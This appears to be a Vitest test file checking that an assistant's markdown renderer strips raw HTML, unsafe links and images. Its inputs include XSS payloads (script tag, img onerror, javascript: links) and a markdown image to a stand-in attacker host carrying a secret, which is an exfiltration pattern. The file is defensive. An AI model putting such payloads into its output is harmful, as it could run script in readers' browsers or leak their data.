// @vitest-environment happy-dom
/** The assistant's markdown: GFM, and nothing a model's text could use to run or fetch. */

import { afterEach, describe, expect, test } from "vitest";
import { byText, click, type Mounted } from "../../../testDom";
import { mountInAssistant } from "../testFakes";
import { AssistantText } from "./AssistantText";

let view: Mounted | null = null;

afterEach(async () => {
  await view?.unmount();
  view = null;
});

async function render(text: string) {
  const mounted = await mountInAssistant(<AssistantText text={text} />);
  view = mounted.view;
  return mounted;
}

describe("AssistantText", () => {
  test("AssistantText renders a GFM table and drops raw HTML", async () => {
    const { view } = await render(
      [
        "| Ticket | Step |",
        "| --- | --- |",
        "| acme/api#212 | build |",
        "",
        '<script>alert("x")</script> <b>bold</b> <img src="x" onerror="alert(1)">',
        "",
        "~~gone~~ and a [ ] task",
      ].join("\n"),
    );
    const root = view.container;
    expect([...root.querySelectorAll("th")].map((cell) => cell.textContent)).toEqual([
      "Ticket",
      "Step",
    ]);
    expect([...root.querySelectorAll("td")].map((cell) => cell.textContent)).toEqual([
      "acme/api#212",
      "build",
    ]);
    expect(root.querySelector("script, b, img, [onerror]")).toBeNull();
    expect(root.textContent).not.toContain("alert");
    expect(root.querySelector("del")?.textContent).toBe("gone");
  });

  test("AssistantText keeps only http(s) and dashboard links", async () => {
    const { view, where } = await render(
      [
        "[docs](https://example.com/guide)",
        "[ticket](/tickets/212)",
        "[script](javascript:alert(1))",
        "[data](data:text/html,hi)",
        "[mail](mailto:operator@example.com)",
        "[elsewhere](//evil.example/path)",
        "[relative](tickets/3)",
      ].join(" "),
    );
    const root = view.container;
    const links = [...root.querySelectorAll("a")];
    expect(links.map((link) => [link.textContent, link.getAttribute("href")])).toEqual([
      ["docs", "https://example.com/guide"],
      ["ticket", "/tickets/212"],
    ]);
    expect(links[0]?.getAttribute("target")).toBe("_blank");
    expect(links[0]?.getAttribute("rel")).toContain("noreferrer");
    // Not blue: a link keeps the text's colour and says what it is with an underline.
    for (const link of links) expect(link.className).toContain("underline");
    for (const word of ["script", "data", "mail", "elsewhere", "relative"]) {
      expect(root.textContent).toContain(word);
    }
    await click(byText(root, "a", "ticket"));
    expect(where()).toBe("/tickets/212");
  });

  test("AssistantText never loads an image, whatever its address", async () => {
    const { view } = await render("![the chart](https://evil.example/p.png?secret=1)");
    expect(view.container.querySelector("img")).toBeNull();
    expect(view.container.textContent).toContain("the chart");
  });
});
